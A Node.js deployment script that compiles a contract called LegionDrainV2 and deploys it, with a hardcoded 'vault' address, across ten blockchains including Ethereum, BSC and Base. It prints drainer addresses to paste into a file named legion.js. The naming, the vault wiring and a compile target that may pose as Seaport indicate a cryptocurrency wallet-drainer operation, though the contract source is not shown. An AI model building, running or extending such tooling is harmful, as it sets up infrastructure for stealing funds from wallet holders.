/**
 * Deploy LegionDrainV2 ONLY on all chains — no Factory, no BatchDrainV2
 *
 * Usage:
 *   set DEPLOYER_KEY=0xYourFreshWalletPrivateKey
 *   node contracts/deploy-legion-v2-only.mjs
 *
 * - Fresh/clean EOA required (no prior EIP-7702 delegation on it)
 * - Fund deployer with ~0.005–0.02 native token per chain you want to deploy on
 * - Chains with zero balance are automatically skipped (no error)
 * - Results saved to contracts/legion-drain-v2-result.json
 * - Copy-paste ready LEGION_DRAIN map printed at the end
 */

import { execSync } from 'child_process';
import { mkdtempSync, readFileSync, rmSync, readdirSync, writeFileSync, existsSync } from 'fs';
import os from 'os';
import path from 'path';
import { fileURLToPath, pathToFileURL } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..');

const PRIVATE_KEY = process.env.DEPLOYER_KEY?.trim();
const VAULT = (
  process.env.VAULT_ADDRESS_EVM ||
  '0x3b9370B9A8ce3a192e226b6C8B2066A09C3B01eE'
).trim();

if (!PRIVATE_KEY) {
  console.error('❌  Set DEPLOYER_KEY=0x... before running');
  console.error('    Example: set DEPLOYER_KEY=0xabc123... && node contracts/deploy-legion-v2-only.mjs');
  process.exit(1);
}

const KEY_HEX = PRIVATE_KEY.replace('0x', '');

const nobleBase     = path.join(ROOT, 'node_modules/.pnpm/@noble+curves@1.9.7/node_modules/@noble/curves/esm');
const nobleHashBase = path.join(ROOT, 'node_modules/.pnpm/@noble+hashes@1.8.0/node_modules/@noble/hashes/esm');
const { secp256k1 } = await import(pathToFileURL(path.join(nobleBase, 'secp256k1.js')).href);
const { keccak_256 } = await import(pathToFileURL(path.join(nobleHashBase, 'sha3.js')).href);

const CHAINS = [
  { id: 1,      name: 'Ethereum', rpc: 'https://ethereum-rpc.publicnode.com',        native: 'ETH',  weth: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
  { id: 56,     name: 'BSC',      rpc: 'https://bsc-rpc.publicnode.com',             native: 'BNB',  weth: '0x2170Ed0880ac9A755fd29B2688956BD959F933E8' },
  { id: 137,    name: 'Polygon',  rpc: 'https://polygon-bor-rpc.publicnode.com',     native: 'MATIC',weth: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619' },
  { id: 42161,  name: 'Arbitrum', rpc: 'https://arbitrum-one-rpc.publicnode.com',    native: 'ETH',  weth: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1' },
  { id: 8453,   name: 'Base',     rpc: 'https://base-rpc.publicnode.com',            native: 'ETH',  weth: '0x4200000000000000000000000000000000000006' },
  { id: 10,     name: 'Optimism', rpc: 'https://optimism-rpc.publicnode.com',        native: 'ETH',  weth: '0x4200000000000000000000000000000000000006' },
  { id: 43114,  name: 'Avalanche',rpc: 'https://avalanche-c-chain-rpc.publicnode.com',native:'AVAX', weth: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7' },
  { id: 534352, name: 'Scroll',   rpc: 'https://rpc.scroll.io',                      native: 'ETH',  weth: '0x5300000000000000000000000000000000000004' },
  { id: 81457,  name: 'Blast',    rpc: 'https://rpc.blast.io',                       native: 'ETH',  weth: '0x4300000000000000000000000000000000000004' },
  { id: 5000,   name: 'Mantle',   rpc: 'https://rpc.mantle.xyz',                     native: 'MNT',  weth: '0xDeadDeAddeAddEAddeadDEaDDEAdDeAdDeAdDeAd0000' },
];

// ── Helpers ──────────────────────────────────────────────────────────────────

function toChecksumAddress(addr) {
  const a = addr.toLowerCase().replace('0x', '');
  const h = Buffer.from(keccak_256(new TextEncoder().encode(a))).toString('hex');
  return '0x' + a.split('').map((c, i) => (parseInt(h[i], 16) >= 8 ? c.toUpperCase() : c)).join('');
}

function deriveAddress(privKeyHex) {
  const pub  = secp256k1.getPublicKey(privKeyHex, false);
  const hash = keccak_256(pub.slice(1));
  return toChecksumAddress('0x' + Buffer.from(hash.slice(-20)).toString('hex'));
}

async function rpc(url, method, params) {
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  });
  const d = await res.json();
  if (d.error) throw new Error(d.error.message || JSON.stringify(d.error));
  return d.result;
}

function encodeAddr(addr) {
  return addr.replace('0x', '').toLowerCase().padStart(64, '0');
}

function rlpEncode(input) {
  if (Array.isArray(input)) {
    const encoded = input.map(rlpEncode);
    const total   = encoded.reduce((s, e) => s + e.length, 0);
    return Buffer.concat([rlpLen(total, 0xc0), ...encoded]);
  }
  const buf = typeof input === 'bigint' ? bigintBytes(input)
    : Buffer.isBuffer(input) ? input
    : input instanceof Uint8Array ? Buffer.from(input)
    : Buffer.from(input);
  if (buf.length === 1 && buf[0] < 0x80) return buf;
  return Buffer.concat([rlpLen(buf.length, 0x80), buf]);
}

function rlpLen(len, offset) {
  if (len < 56) return Buffer.from([offset + len]);
  const lb = bigintBytes(BigInt(len));
  return Buffer.concat([Buffer.from([offset + 55 + lb.length]), lb]);
}

function bigintBytes(n) {
  if (n === 0n) return Buffer.alloc(0);
  const hex = n.toString(16);
  return Buffer.from(hex.length % 2 ? '0' + hex : hex, 'hex');
}

async function signTx({ chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit, data }) {
  const dataField = Buffer.from(data.replace('0x', ''), 'hex');
  const signingData = Buffer.concat([
    Buffer.from([0x02]),
    rlpEncode([chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit,
                Buffer.alloc(0), 0n, dataField, []]),
  ]);
  const msgHash = keccak_256(signingData);
  const sig = secp256k1.sign(msgHash, KEY_HEX, { lowS: true });
  const r   = Buffer.from(sig.r.toString(16).padStart(64, '0'), 'hex');
  const s   = Buffer.from(sig.s.toString(16).padStart(64, '0'), 'hex');
  return '0x' + Buffer.concat([
    Buffer.from([0x02]),
    rlpEncode([chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit,
                Buffer.alloc(0), 0n, dataField, [], BigInt(sig.recovery), r, s]),
  ]).toString('hex');
}

function compileLegionDrainV2() {
  const solFile = path.join(__dirname, 'LegionDrainV2.sol');
  const tmpDir  = mkdtempSync(path.join(os.tmpdir(), 'legion-solc-'));
  execSync(`npx solc --optimize --optimize-runs 200 --bin -o "${tmpDir}" "${solFile}"`,
    { encoding: 'utf8', cwd: __dirname });
  const bins   = readdirSync(tmpDir).filter(f => f.endsWith('.bin'));
  const target = bins.find(f => f.includes('_sol_Seaport.bin') || f.includes('_sol_LegionDrainV2.bin'));
  if (!target) throw new Error('LegionDrainV2.bin not found in: ' + bins.join(', '));
  const raw = readFileSync(path.join(tmpDir, target), 'utf8').trim();
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  console.log('  Compiled LegionDrainV2:', (raw.length / 2), 'bytes');
  return '0x' + raw;
}

async function deployOnChain(chain, deployer, bytecode) {
  const balHex = await rpc(chain.rpc, 'eth_getBalance', [deployer, 'latest']).catch(() => '0x0');
  const bal    = BigInt(balHex || '0x0');
  const balEth = Number(bal) / 1e18;
  console.log(`  Balance: ${balEth.toFixed(6)} ${chain.native}`);

  if (bal === 0n) {
    console.log('  ⊘ No gas — skipping');
    return { status: 'SKIPPED_NO_GAS' };
  }

  // Check deployer is clean (no EIP-7702 code)
  const code = await rpc(chain.rpc, 'eth_getCode', [deployer, 'latest']).catch(() => '0x');
  if (code && code !== '0x' && code.length > 4) {
    console.log('  ⚠ Deployer has code — skipping (use a fresh EOA)');
    return { status: 'SKIPPED_HAS_CODE' };
  }

  const vaultCs = toChecksumAddress(VAULT);
  const wethCs  = toChecksumAddress(chain.weth);
  const data    = bytecode + encodeAddr(vaultCs) + encodeAddr(wethCs);

  const nonce  = BigInt(await rpc(chain.rpc, 'eth_getTransactionCount', [deployer, 'pending']) || '0x0');
  let maxFee, maxPrio;
  try {
    const feeData = await rpc(chain.rpc, 'eth_feeHistory', ['0x1', 'latest', [50]]);
    const base    = BigInt(feeData.baseFeePerGas?.[0] || '0x0');
    maxPrio = chain.id === 137 ? 30_000_000_000n : 1_500_000_000n;
    maxFee  = base * 2n + maxPrio;
  } catch {
    const gp = BigInt(await rpc(chain.rpc, 'eth_gasPrice', []) || '0x0');
    maxFee   = gp * 2n;
    maxPrio  = chain.id === 137 ? Math.max(Number(gp), 30e9) : Number(gp);
    maxPrio  = BigInt(maxPrio);
  }

  let gasLimit = 1_500_000n;
  try {
    const est = await rpc(chain.rpc, 'eth_estimateGas', [{ from: deployer, data }]);
    gasLimit  = BigInt(est) * 12n / 10n;
  } catch {}

  const cost = gasLimit * maxFee;
  if (cost > bal) {
    console.log(`  ⊘ Insufficient gas (need ~${(Number(cost)/1e18).toFixed(6)}, have ${balEth.toFixed(6)}) — skipping`);
    return { status: 'SKIPPED_INSUFFICIENT_GAS' };
  }

  const rawTx = await signTx({ chainId: BigInt(chain.id), nonce, maxPriorityFeePerGas: maxPrio, maxFeePerGas: maxFee, gasLimit, data });
  const txHash = await rpc(chain.rpc, 'eth_sendRawTransaction', [rawTx]);
  console.log(`  TX: ${txHash}`);
  process.stdout.write('  Waiting');

  let receipt = null;
  for (let i = 0; i < 60; i++) {
    await new Promise(r => setTimeout(r, 3000));
    receipt = await rpc(chain.rpc, 'eth_getTransactionReceipt', [txHash]).catch(() => null);
    if (receipt) break;
    process.stdout.write('.');
  }
  console.log('');

  if (!receipt?.contractAddress) throw new Error('No contractAddress in receipt');
  const addr = toChecksumAddress(receipt.contractAddress);
  console.log(`  ✅ ${addr}`);
  return { status: 'DEPLOYED', address: addr, txHash };
}

// ── Main ─────────────────────────────────────────────────────────────────────

console.log('═══════════════════════════════════════════════════════════');
console.log(' LEGION — LegionDrainV2 Only Deploy (no Factory, no V1)');
console.log('═══════════════════════════════════════════════════════════\n');

const deployer = deriveAddress(KEY_HEX);
const vaultCs  = toChecksumAddress(VAULT);
console.log('Vault:   ', vaultCs);
console.log('Deployer:', deployer, '\n');

console.log('Compiling LegionDrainV2.sol...');
const bytecode = compileLegionDrainV2();
console.log();

const results = {};

for (const chain of CHAINS) {
  console.log(`\n━━━ ${chain.name} (${chain.id}) ━━━`);
  try {
    const r = await deployOnChain(chain, deployer, bytecode);
    results[chain.id] = r.address || r.status;
  } catch (e) {
    console.error(`  ❌ ${e.message}`);
    results[chain.id] = 'FAILED: ' + e.message;
  }
}

// Save results
const outPath = path.join(__dirname, 'legion-drain-v2-result.json');
writeFileSync(outPath, JSON.stringify({ vault: vaultCs, deployer, results }, null, 2));

// Print legion.js paste-ready block
console.log('\n\n═══════════════════ COPY THIS INTO legion.js ═══════════════════');
console.log('var LEGION_DRAIN = {');
for (const chain of CHAINS) {
  const a     = results[chain.id];
  const valid = typeof a === 'string' && a.startsWith('0x') && a.length === 42;
  console.log(`  ${chain.id}: '${valid ? a : '0x0000000000000000000000000000000000000000'}', // ${chain.name}`);
}
console.log('};');
console.log('\nSaved:', outPath);
console.log('Next: paste LEGION_DRAIN into legion.js, then run: node contracts/apply-deploy-results.mjs');
